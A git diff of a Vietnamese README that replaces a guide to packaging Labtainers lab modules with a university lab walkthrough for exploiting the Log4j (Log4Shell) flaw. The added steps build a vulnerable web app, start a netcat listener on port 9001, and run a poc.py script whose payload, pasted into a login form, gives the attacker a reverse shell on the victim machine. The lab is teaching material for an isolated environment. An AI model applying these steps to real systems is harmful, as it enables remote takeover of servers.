@@ -1,154 +1,35 @@
-# TTTN-2025
+1. Nội dung và hướng dẫn thực hiện bài thực hành
+1.1.  Mục đích
+Giúp sinh viên hiểu biết về lỗ hỏng Log4j, cách khai thác lỗ hỏng và các dạng tấn công. Cho phép máy attacker chiếm quyền điều khiển máy victim
+1.2 Yêu cầu đối với sinh viên
+Có kiến thức cơ bản về hệ điều hành Linux, mô hình mạng máy chủ/khách.
+1.3 Nội dung thực hành
+	- Khởi động bài lab:
+	Vào terminal gõ:
+			labtainer ptit-log4j -r 
+(chú ý: sinh viên sử dụng email stu.ptit.edu.vn của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm)
+Sau khi khởi động bài lab xong thì sẽ có 3 terminal ảo xuất hiện, hai cái đại diện cho máy attack: attacker và một máy đại diện cho máy victim: victim. Biết rằng 2 máy này cùng mạng LAN.
+Ở trên terminal victim: ta sử dụng quyền root để truy cập vào thư mục log4j-shell-poc. Sau khi truy cập vào thư mục ta bắt đầu build docker với lệnh:
+			sudo docker build -t log4j-shell-poc . 
+Sau khi build xong ta chạy lệnh docker run để thiết lập môi trường với lệnh:
+			sudo docker run --network host log4j-shell-poc
+Khi nhập lệnh xong, ta sẵn sàng máy chủ ứng dụng web dễ bị tấn công, bây giờ ta hãy duyệt đến địa chỉ IP máy victim trong trình duyệt tại cổng 8080.
+Ở trên terminal đầu tiên attacker: ta sử dụng quyền root để truy cập vào thư mục chứa file jdk java jdk-8u202-linux-x64.tar.gz và giải nén jdk với lệnh:
+			tar -xf jdk-8u202-linux-x64.tar.gz
+	Sau khi giải nén xong thì ta chuyển file jdk vào thư mục /usr/bin
+			mv jdk1.8.0_202 /usr/bin
+Tiếp theo ta truy cập vào thư mục log4j-shell-poc ở trên terminal attacker còn lại. Thư mục đó chứa tập lệnh python, poc.py mà ta sẽ phải cấu hình chỉnh sửa nano poc.py. Ở đây ta cần sửa đổi đường dẫn của file jdk ‘ ./jdk1.8.2.20/ ’ thành ‘ /usr/bin/jdk1.8.0_202/ ’
+Khi mà tất cả các thay đổi đã xong ta lưu file lại và bắt đầu tấn công. Đầu tiên ta khởi tạo trình nghe netcat với cổng 9001 trên terminal attacker đầu tiên:
+			nc -lvp 9001
+Tiếp theo ta sẽ khởi tạo LDAP ở terminal attacker còn lại để tạo payload để request đến webserver
+python3 poc.py --userip <IP máy attacker> --webport 8000 --lport 9001
+Sau khi tạo thành công payload ta truy cập đến trình duyệt web có địa chỉ IP máy victim ta dán payload vào username và password để bất kỳ rồi ta login.
+Khi login xong thì ở cửa sổ netcat ta nhận được 1 trình bao ngược lại và ta đã chiếm được quyền điều khiển máy victim.
+- Kết thúc bài lab:
+•	Trên terminal đầu tiên sử dụng câu lênh sau để kết thúc bài lab:
+stoplab ptit-log4j
+•	Khi bài lab kết thúc, một tệp zip lưu kết quả được tạo và lưu vào một vị trí được hiển thị bên dưới stoplab.
+- Khởi động lại bài lab:
+•	Trong quá trình làm bài sinh viên cần thực hiện lại bài lab, dùng câu lệnh:
+labtainer ptit-log4j -r
 
-Cách đóng gói imodule trong github
-# Labtainers – Đóng gói IModule cho từng bài lab (publish lên Docker Hub trước)
-
- quy trình **đóng gói IModule** cho một bài lab Labtainers và cách tổ chức **mỗi lab trên một nhánh Git** để chỉ pack đúng lab cần thiết.
-
----
-
-## 0) Yêu cầu & Chuẩn bị
-
-- Đã cài Labtainers và chạy cập nhật `updatedesigner.sh`.
-- Có script `create-imodules.sh` (mặc định ở: `~/labtainer/trunk/scripts/designer/bin/create-imodules.sh`).  
-- Có tài khoản Docker Hub **và mật khẩu**.
-
-**Thiết lập registry (bắt buộc trước khi publish):**  
-Mở **labedit** → **Edit** → **config (registry)** → nhập **tên người dùng Docker Hub** (vd: `labattt2025`) → **Build & Run** lại để cập nhật cấu hình.
-
----
-
-## 1)TL;DR
-
-```bash
-# Làm sạch lab (tùy chọn, khuyên dùng)
-python3 ~/labtainer/trunk/scripts/designer/bin/cleanlab4svn.py
-
-# Khởi tạo repo Git (nếu chưa có) tại thư mục labs
-cd ~/labtainer/trunk/labs
-git init
-
-# Add & commit chỉ thư mục lab cần đóng gói
-git add <lab-name>
-git commit -m "Add <lab-name>"
-
-# Publish image của lab lên Docker Hub
-cd $LABTAINER_DIR/distrib
-./publish.py -d -l <lab-name>
-
-# Tạo IModule
-~/labtainer/trunk/scripts/designer/bin/create-imodules.sh
-
-# File đầu ra:
-#   ~/labtainer/trunk/imodule.tar
-```
-
-Upload `imodule.tar` lên GitHub → **nhấn Raw** để lấy **link tải trực tiếp**, rồi phân phối cho sinh viên:
-```bash
-imodule <raw-url-tren-github>
-```
-
----
-
-## 2) Quy trình chi tiết cho 1 bài lab
-
-### Bước 0: Cấu hình registry cho Docker Hub
-- Trong **labedit** → **Edit** → **config (registry)** → nhập username Docker Hub → **Build & Run** lại.
-
-### Bước 1: Dọn rác (khuyến nghị)
-```bash
-cd ~/labtainer/trunk/labs/<lab-name>
-python3 ~/labtainer/trunk/scripts/designer/bin/cleanlab4svn.py
-```
-
-### Bước 2: Tạo/kiểm tra Git repo cục bộ ở `labs/`
-```bash
-cd ~/labtainer/trunk/labs
-git init                    # bỏ qua nếu đã có .git
-git add <lab-name>
-git commit -m "Add <lab-name>"
-git log --oneline           # xác nhận đã commit
-```
-
-> ⚠️ `create-imodules.sh` **chỉ pack các file đang được Git track** (`git ls-files`). Nếu không `git add` thì sẽ **không** được đóng gói.
-
-### Bước 3: Publish image của lab lên Docker Hub
-```bash
-cd $LABTAINER_DIR/distrib
-./publish.py -d -l <lab-name>
-```
-- Quá trình có thể lâu. Sẽ yêu cầu **username**/**password** Docker Hub.
-
-### Bước 4: Tạo IModule
-```bash
-~/labtainer/trunk/scripts/designer/bin/create-imodules.sh
-```
-- Đầu ra: `~/labtainer/trunk/imodule.tar` (sẽ **bị ghi đè** mỗi lần chạy).
-
-### Bước 5: Kiểm tra & phân phối
-```bash
-# Liệt kê nội dung tar (tùy chọn)
-tar -tf ~/labtainer/trunk/imodule.tar
-```
-- Upload `imodule.tar` lên GitHub → mở file → bấm **Raw** → copy URL **Raw**.
-- Hướng dẫn sinh viên:
-```bash
-imodule <raw-url-tren-github>
-```
-
----
-
-## 3) Đóng gói **chỉ 1 lab** bằng **Git branch riêng** (khuyến nghị)
-
-`create-imodules.sh` sẽ pack **toàn bộ** lab đã commit trong **nhánh hiện tại**.  
-Để chỉ pack **duy nhất 1 lab**, dùng **mỗi lab = 1 branch**:
-
-```bash
-# Tại ~/labtainer/trunk/labs
-git branch -a
-git checkout --orphan <lab-name>-branch   # nhánh orphan, không lịch sử
-git rm -rf .                              # xóa index của nhánh (không xóa file ngoài đĩa)
-
-# Thêm lại đúng lab cần pack
-git add <lab-name>
-git commit -m "Add <lab-name> only"
-
-# Publish & tạo IModule
-cd $LABTAINER_DIR/distrib
-./publish.py -d -l <lab-name>
-
-~/labtainer/trunk/scripts/designer/bin/create-imodules.sh
-# => ~/labtainer/trunk/imodule.tar (chỉ chứa <lab-name>)
-```
-
-> Mỗi lab một branch giúp:
-> - Dễ quản lý 10–20 labs độc lập.
-> - Không cần xóa lab cũ; update lab nào thì checkout branch tương ứng, commit & chạy lại.
-> - Đảm bảo `imodule.tar` chỉ chứa đúng lab của nhánh.
-
----
-
-## 4) cheat-sheet
-
-```bash
-# Dọn lab
-python3 ~/labtainer/trunk/scripts/designer/bin/cleanlab4svn.py
-
-# Git tại ~/labtainer/trunk/labs
-git init
-git add <lab-name>
-git commit -m "Add <lab-name>"
-git checkout --orphan <lab-name>-branch
-git rm -rf .
-git add <lab-name>
-git commit -m "Add <lab-name> only"
-
-# Publish & tạo IModule
-cd $LABTAINER_DIR/distrib
-./publish.py -d -l <lab-name>
-~/labtainer/trunk/scripts/designer/bin/create-imodules.sh
-
-# Kiểm tra & phân phối
-tar -tf ~/labtainer/trunk/imodule.tar
-imodule <raw-url-tren-github>
-```
